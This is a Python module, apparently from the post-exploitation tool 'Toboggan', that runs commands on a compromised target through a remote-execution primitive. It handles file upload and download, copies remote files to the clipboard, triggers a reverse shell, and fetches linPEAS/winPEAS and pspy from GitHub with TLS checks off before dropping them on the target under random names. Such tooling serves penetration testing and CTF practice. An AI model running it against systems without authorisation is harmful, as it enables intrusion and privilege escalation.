# Built-in imports
import sys
from typing import TYPE_CHECKING
from pathlib import Path
import secrets
import re

# Third party library imports
import httpx
import pyperclip

# Local library imports
from toboggan.src import interactivity, aliases
from toboggan.src import utils

# Type checking
if TYPE_CHECKING:
    from toboggan.src import target

# Module variables definition

DEFAULT_PREFIX = "/"

INTERACTIVITY_CLASSES = {
    "unix": [
        interactivity.UnixNamedPipe,
        # Add more classes if needed
    ],
    "windows": [],
}

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}


class Commands:
    """Handle commands for the terminal interface, including special prefixed commands and default terminal commands.

    Attributes:
       __target: Reference to the target object.
       __interactivity: Instance of an interactivity class.
       __aliases: Instance of the Aliases class.
       __command_map: A mapping of command names to their respective methods.
    """

    def __init__(
        self,
        target: "target.Target",
        prefix: str = None,
    ):
        # Store a reference to both terminal and interactivity instances
        self.__target = target
        self.__interactivity = None

        prefix = prefix or DEFAULT_PREFIX

        # Create an instance of the Aliases class
        self.__aliases = aliases.Aliases(
            os=self.__target.os,
            prefix=prefix,
        )

        # Create an instance of the exploit

        self.__command_map = {
            "help": self.__help,
            "aliases": self.__aliases.display_aliases,
            "copy": self.__handle_copy,
            "exit": self.terminate,
            "i": self.start_interactivity,
            "peas": self.__upload_peas,
            "pspy": self.__upload_pspy,
            "put": self.__handle_put,
            "get": self.__handle_get,
            "chunk_size": self.__target.executor.determine_best_chunk_size,
            "revshell": self.__target.reverse_shell,
        }

        # Prepend each command with the prefix
        self.__command_map = {
            prefix + cmd: method for cmd, method in self.__command_map.items()
        }

    # Public methods
    def handle(self, command: str) -> str:
        """
        Handle the provided command. Verify if it is prefixed or not.

        Args:
            command (str): The command passed as an argument containing the prefix.

        Returns:
            str: The output of the executed command.
        """
        final_command = ""
        if command.startswith(self.__aliases.prefix):
            special_command = command.split(maxsplit=1)[0]

            args = command.split()[1:] if len(command.split()) > 1 else []

            if special_command in self.__command_map:
                # Run the invoked method
                try:
                    return self.__command_map[special_command](*args)
                except TypeError:
                    # Occures when argument is missing
                    return

            elif special_command in self.__aliases:
                final_command = self.__aliases[special_command]
            else:
                print(f"[Toboggan] Unknown prefixed command: {command}")
                return None
        else:
            final_command = command

        if self.__interactivity is not None:
            return self.__interactivity.execute(final_command)

        if final_command is None:
            return

        return self.__target.executor.remote_execute(
            command=final_command, timeout=30, retry=False
        )

    def start_interactivity(
        self, read_interval: float = None, session_identifier: str = None
    ) -> None:
        """
        Start an interactivity session based on the target's OS.

        Args:
            read_interval (float): Interval at which to read output.
            session_identifier (str): Unique identifier for the session.
        """
        if self.__interactivity is not None:
            return

        # Get a list of possible interactivity classes for the target's OS
        possible_classes = INTERACTIVITY_CLASSES.get(self.__target.os, [])

        # Check if there are any classes available for the target's OS
        if not possible_classes:
            print(
                f"[Toboggan] No interactivity classes available for OS: {self.__target.os}"
            )
            return

        # Choose a random class
        chosen_class = secrets.choice(possible_classes)
        print(f"[Toboggan] Interactivity will use {chosen_class.__name__!r}.")

        self.__interactivity = chosen_class(
            target=self.__target,
            read_interval=read_interval
            or utils.random_float_in_range(min_value=0.5, max_value=1.5),
            session_identifier=session_identifier
            or utils.generate_random_token(min_length=5, max_length=10),
        )
        self.__interactivity.start()

    def terminate(self) -> None:
        """
        Terminate the current session. If interactivity is active, prompt to save the session.
        """
        if self.__interactivity is not None:
            keeping = utils.yes_no_query(
                prompt="[Toboggan] Would you like to save the current session?",
            )
            self.__interactivity.stop(keep_session=keeping)
        sys.exit(0)

    def get_prompt(self) -> str:
        """
        Generate a command prompt string based on the target details.
        If the interactivity attribute is set, an empty string is returned instead.

        Returns:
            str: Command prompt string encapsulating user, hostname, and current working directory
                details of the target. Returns an empty string if interactivity is enabled.
        """
        if self.__interactivity is not None:
            return ""

        return f"[Toboggan] ({self.__target.user}@{self.__target.hostname})-[{self.__target.pwd}]$ "

    # Private methods
    def __help(self) -> str:
        """Display a list of available commands with their descriptions."""

        # Determine the maximum length of commands for proper alignment
        max_command_length = max(len(command) for command in self.__command_map.keys())

        help_str = "[Toboggan] Available commands:\n"
        for command, cmd_method in sorted(self.__command_map.items()):
            description = cmd_method.__doc__  # Extract the docstring
            if description:  # Check if the docstring exists
                # Use split to get the first line or sentence
                short_description = description.strip().split("\n")[0]

                # Use ljust to left-align the command and pad with spaces to max_command_length, then add a tab character
                help_str += (
                    f"\t{command.ljust(max_command_length)}\t=> {short_description}\n"
                )

        return help_str

    def __handle_copy(self, remote_path: str) -> None:
        """
        Fetch the contents of a remote file and copy them to the local clipboard.

        Depending on the target's OS, the appropriate command (`type` for Windows and `cat` for Unix-like systems)
        is executed on the remote system to retrieve the contents of the specified file.
        Once fetched, the content is copied to the local clipboard using the `pyperclip` library.

        Args:
            remote_path (str): The path to the remote file whose contents need to be copied to the clipboard.
        """

        # Determine the appropriate command based on the OS of the target.
        if self.__target.os == "windows":
            command = f"type {remote_path}"
        else:
            command = f"cat {remote_path}"

        file_contents = self.__target.executor.remote_execute(command).strip()

        if file_contents:
            pyperclip.copy(file_contents)
            print(f"[Toboggan] Copied contents of '{remote_path}' to clipboard.")
        else:
            print(f"[Toboggan] Failed to fetch or copy contents of '{remote_path}'.")

    def __handle_put(self, local_path: str, remote_path: str = None):
        """
        Uploads a file to the target.
        """

        local_path = Path(local_path).expanduser().resolve()

        if remote_path is None:
            remote_path = f"{self.__target.remote_working_directory}/{local_path.name}"

        if not local_path.exists():
            print(f"[Toboggan] The following path does not exist: '{str(local_path)}'")
            return

        self.__target.upload(
            file_content=local_path.read_bytes(),
            remote_path=remote_path,
        )

    def __handle_get(self, remote_path: str):
        """
        Downloads a file from the target.
        """
        local_path = f"{str(Path().cwd())}/{Path(remote_path).name}"
        self.__target.download(
            remote_path=remote_path,
            local_path=local_path,
        )

    def __upload_peas(self, remote_path: str = None) -> None:
        """
        Fetch the latest (win/lin)peas script according to the target's OS from its official repository
        and upload it to the target system.

        Args:
            remote_path (str, optional): Destination path on the target where the script should be uploaded.
                If not provided, a default path in the target's working directory with a random name will be used.
        """
        peas_version = "linpeas.sh"
        if self.__target.os == "windows":
            peas_version = "winPEASany.exe"

        print(f"[Toboggan] Fetching latest {peas_version} from repository 🌐")
        try:
            with httpx.Client(
                http1=True,
                verify=False,
                headers=HEADERS,
                follow_redirects=True,
            ) as client:
                response = client.get(
                    url=f"https://github.com/carlospolop/PEASS-ng/releases/latest/download/{peas_version}"
                )
        except Exception as error:
            print(f"[Toboggan] Error during linpeas fetching: {error}")
            return
        else:
            # Check if the request was successful
            if response.status_code != 200:
                return None

            # Set a default remote path if not provided
            if remote_path is None:
                remote_path = f"{self.__target.remote_working_directory}/{utils.generate_random_token(3,4)}"

            self.__target.upload(file_content=response.content, remote_path=remote_path)

    def __upload_pspy(self, remote_path: str = None) -> None:
        """
        Fetch the latest pspy binary based on the target's architecture from its official repository
        and upload it to the target system.

        This method will determine the appropriate version of pspy based on the target's architecture
        (e.g., 32-bit or 64-bit) and fetch it from the repository.

        Args:
            remote_path (str, optional): Destination path on the target where the binary should be uploaded.
                If not provided, a default path in the target's working directory with a random name will be used.
        """
        try:
            with httpx.Client(
                http1=True,
                verify=False,
                headers=HEADERS,
                follow_redirects=True,
            ) as client:
                response = client.get(url="https://github.com/DominicBreuker/pspy")

                adjusted_arch = self.__target.architecture.replace("-bit", "")

                # Using regex to extract href for the appropriate architecture
                pattern = rf'<a href="(https://github.com/DominicBreuker/pspy/releases/download/v[^/]+/pspy{adjusted_arch})">download</a>'
                if match := re.search(pattern=pattern, string=response.text):
                    download_url = match.group(1)
                    print(f"[Toboggan] Downloading pspy from {download_url} 🌐")
                    # Download binary content
                    download_response = client.get(url=download_url)
                    download_response.raise_for_status()
        except Exception as error:
            print(f"[Toboggan] Error during pspy uploading: {error}")
            return
        else:
            # Set a default remote path if not provided
            if remote_path is None:
                remote_path = f"{self.__target.remote_working_directory}/{utils.generate_random_token(3,4)}"

            self.__target.upload(
                file_content=download_response.content, remote_path=remote_path
            )

    # Properties
    @property
    def prefix(self) -> str:
        return self.prefix
